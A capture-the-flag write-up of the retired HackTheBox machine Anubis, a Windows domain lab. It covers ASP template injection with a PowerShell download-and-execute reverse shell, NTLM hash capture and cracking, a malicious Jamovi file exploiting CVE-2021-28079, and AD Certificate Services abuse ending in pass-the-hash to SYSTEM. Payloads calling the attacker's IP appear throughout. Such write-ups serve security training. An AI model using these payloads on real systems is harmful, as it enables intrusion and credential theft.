# Anubis

This is the write-up for the box Anubis that got retired at the 29th January 2022.
My IP address was 10.10.14.3 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.102    anubis.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/anubis.nmap 10.10.11.102
```

```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2022-12-24T15:52:24+00:00; +1h00m01s from scanner time.
| ssl-cert: Subject: commonName=www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Not valid before: 2021-05-24T19:44:56
|_Not valid after:  2031-05-24T19:54:56
445/tcp open  microsoft-ds?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking HTTPS (Port 443)

The TLS certificate contains a hostname _www.windcorp.htb_ that has to be added to our _/etc/hosts_ file to access it.
The website on the hostname looks like a custom developed company website and has potential usernames:

- Walter White (Chief Executive Officer)
- Sarah Jhonson (Product Manager)
- William Anderson (CTO)
- Amanda Jepson (Accountant)

On the bottom of the page is a contact form and **Cross Site Scripting (XSS)** can be tested there:
```
Name: 	Test1
E-mail: 	test@test.local
Subject: 	Test 1
Message: 	<script src="https://10.10.14.3/test.js"></script>
```

After sending the request, it forwards to _preview.asp_ and our listener on port 443 receives a response, so there is a vulnerability in this form.

We can test for **Server Side Template Injection (SSTI)** by using the polyglot payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#detection) in the message field.
After removing one symbol at a time, it does error until _"${{<"_, which means that the _percent symbol (%)_ is responsible for the error.

These symbols can be used in ASP to test code execution:
```
<%= 7*7 %>
```

In the _preview.asp_ it shows the message as _49_, which means that it was calculated and there is a way to execute code:
```
Message: 49
```

Testing payload to execute `whoami`:
```
<%= CreateObject("Wscript.Shell").exec("whoami").StdOut.ReadAll() %>
```
```
Message: nt authority\system
```

I will use the _Invoke-PowerShellTcpOneLine.ps1_ script from the **Nishang framework** as the reverse shell command.
Downloading and executing the PowerShell script to gain a reverse shell:
```
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/shell.ps1')").StdOut.ReadAll() %>
```

After sending the request, it will download and execute the script and the listener on my IP and port 9001 starts a shell as the _SYSTEM_ user on the hostname _webserver01_.
This does not seem to be the target box, but instead a virtualized client or some kind of container.

## Lateral Movement

In the desktop folder of the _Administrator_ user is a file called _req.txt_, which is a **TLS Certificate**.

Copying and reading certificate with `openssl`:
```
openssl req -in req.txt -noout -text
```

The certificate has another hostname _softwareportal.windcorp.htb_ that has to be added to our _/etc/hosts_ file.
This hostname is used on another service, so [Chisel](https://github.com/jpillora/chisel) can be used to create a tunnel from the machine to our client to enumerate ports and other IPs.

Uploading _chisel.exe_ to the box:
```
curl 10.10.14.3/chisel.exe -o chisel.exe
```

Starting **Chisel** server on our client:
```
./chisel server --socks5 --reverse -p 8000
```

Connecting to the **Chisel** server from the box:
```
.\chisel.exe client 10.10.14.3:8000 R:socks
```

The subnet is big and scanning could take long, but the default gateway can be scanned for some known ports:
```
IPv4 Address. . . . . . . . . . . : 172.20.180.149
Subnet Mask . . . . . . . . . . . : 255.255.240.0
Default Gateway . . . . . . . . . : 172.20.176.1
```

Port scanning default gateway:
```
proxychains nmap -sT -Pn -n -p 80,443 172.20.176.1
```
```
PORT    STATE  SERVICE
80/tcp  open   http
443/tcp closed https
```

Adding hostname with the IP to our _/etc/hosts_ file to access it on a browser:
```
172.20.176.1    softwareportal.windcorp.htb
```

After configuring the proxy in the browser accordingly, it is possible to access the web service on port 80.

### Enumerating Web Service

The website has a list of known software packages and according to the URL, they are loaded from the IP of _webserver01_:
```
http://softwareportal.windcorp.htb/install.asp?client=172.20.180.149&software=7z1900-x64.exe
```

When changing the _client_ parameter to our client and sniffing the network packets with **Wireshark**, then we observe that it tries to connect to port 5985.
This port is used for **WinRM** and a listener with **Responder** can be started to intercept the authentication hash:
```
responder -I tun0
```

Changing _client_ parameter to our IP and sending the request:
```
http://softwareportal.windcorp.htb/install.asp?client=10.10.14.3&software=jamovi-1.6.16.0-win64.exe
```

The **NetNTLMv2** of the user _localadmin_ is intercepted:
```
[WinRM] NTLMv2 Client   : 10.10.11.102
[WinRM] NTLMv2 Username : windcorp\localadmin
[WinRM] NTLMv2 Hash     : localadmin::windcorp:89cd95c4837c8e29:10E5D931BD8899E673F9642DC3B2(...)
```

Trying to crack the hash with **Hashcat**:
```
hashcat -m 5600 anubis_localadmin.hash /usr/share/wordlists/rockyou.txt
```
```
Secret123
```

After a while it gets cracked and the password can be verified by accessing the SMB shares with **CrackMapExec**:
```
crackmapexec smb 10.10.11.102 -u localadmin -p Secret123 --shares
```
```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
CertEnroll      READ            Active Directory Certificate Services share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
Shared          READ            
SYSVOL          READ            Logon server share
```

## Checking SMB (Port 445)

The SMB share _Shared_ is a non-default share, so it should be enumerated:
```
smbclient -U localadmin //10.10.11.102/Shared
```

There are two folders:
- Documents
  - Big 5.omv
  - Bugs.omv
  - Tooth Growth.omv
  - Whatif.omv

- Software
  - 7z1900-x64.exe
  - jamovi-1.6.16.0-win64.exe
  - VNC-Viewer-6.20.529-Windows.exe

The folder _Documents_ has OMV files, which is the [file extension that Jamovi uses](https://docs.jamovi.org/_pages/info_file-format.html).
There is a **Cross-Site Scripting (XSS)** vulnerability [CVE-2021-28079](https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md) in the software **Jamovi** in version 1.6.18 and below.

### Exploiting Jamovi

Downloading _Whatif.omv_ to use it as a template for our exploit:
```
smb: \Documents\Analytics\> get Whatif.omv
```

Extracting the file:
```
unzip Whatif.omv
```

Adding XSS payload to a column name:
```
(...)
"name": "a<script src='http://10.10.14.3/payload.js'></script>",
"id": 1,
"columnType": "Data",
"dataType": "Decimal",
(...)
```

Creating OMV file with `zip` and naming it _Whatif.omv_:
```
zip -r Whatif.omv *
```

Creating _payload.js_ to execute command:
```js
<script>
require('child_process').exec("powershell IEX((New-Object Net.WebClient).downloadString('http://10.10.14.3/shell.ps1'))")
</script>
```

Uploading modified _Whatif.omv_ to the SMB share:
```
smb: \Documents\Analytics\> put Whatif.omv
```

After a while, the new _Whatif.omv_ gets processed and runs the JavaScript payload, which executes _shell.ps1_ so the listener on my IP and port 9001 starts a shell as the user _diegocruz_.

## Privilege Escalation

In the SMB shares, there is a share _CertEnroll_ which exists only when **Active Directory Certificate Services** are enabled.
To abuse this service, the [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) vulnerabilities will be used.

- [Cheat Sheet on ired.team notes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate)
- [Cheat Sheet on HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)

Tools needed for exploitation:
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Certify](https://github.com/GhostPack/Certify)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- [ADCS.ps1](https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1)
  - Change _userprincipalname_ to _samaccountname_ on line 929

```
$TargetUPN = $user.samaccountname
```

Executing **Certify** to find vulnerable certificates:
```
Certify.exe find /vulnerable /currentuser
```

The template _Web_ is vulnerable, so running the _Get-SmartCardCertificate_ command from **ADCS.ps1** to create SmartCard Certificate:
```
Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard
```

Confirming that a certificate was created:
```
gci cert:\currentuser\my -recurse
```

Executing **Rubeus** to get the hash of _Administrator_ by authenticating with the certificate:
```
Rubeus.exe asktgt /user:Administrator /certificate:E5EF6773C206F55C4DDAEE3C222AC729005075A4 /getcredentials
```

Using **impacket-psexec** to authenticate to the box with the hash:
```
impacket-psexec -hashes 3CCC18280610C6CA3156F995B5899E09:3CCC18280610C6CA3156F995B5899E09 administrator@10.10.11.102
```

The hash is accepted and starts a shell as the _SYSTEM_ user!
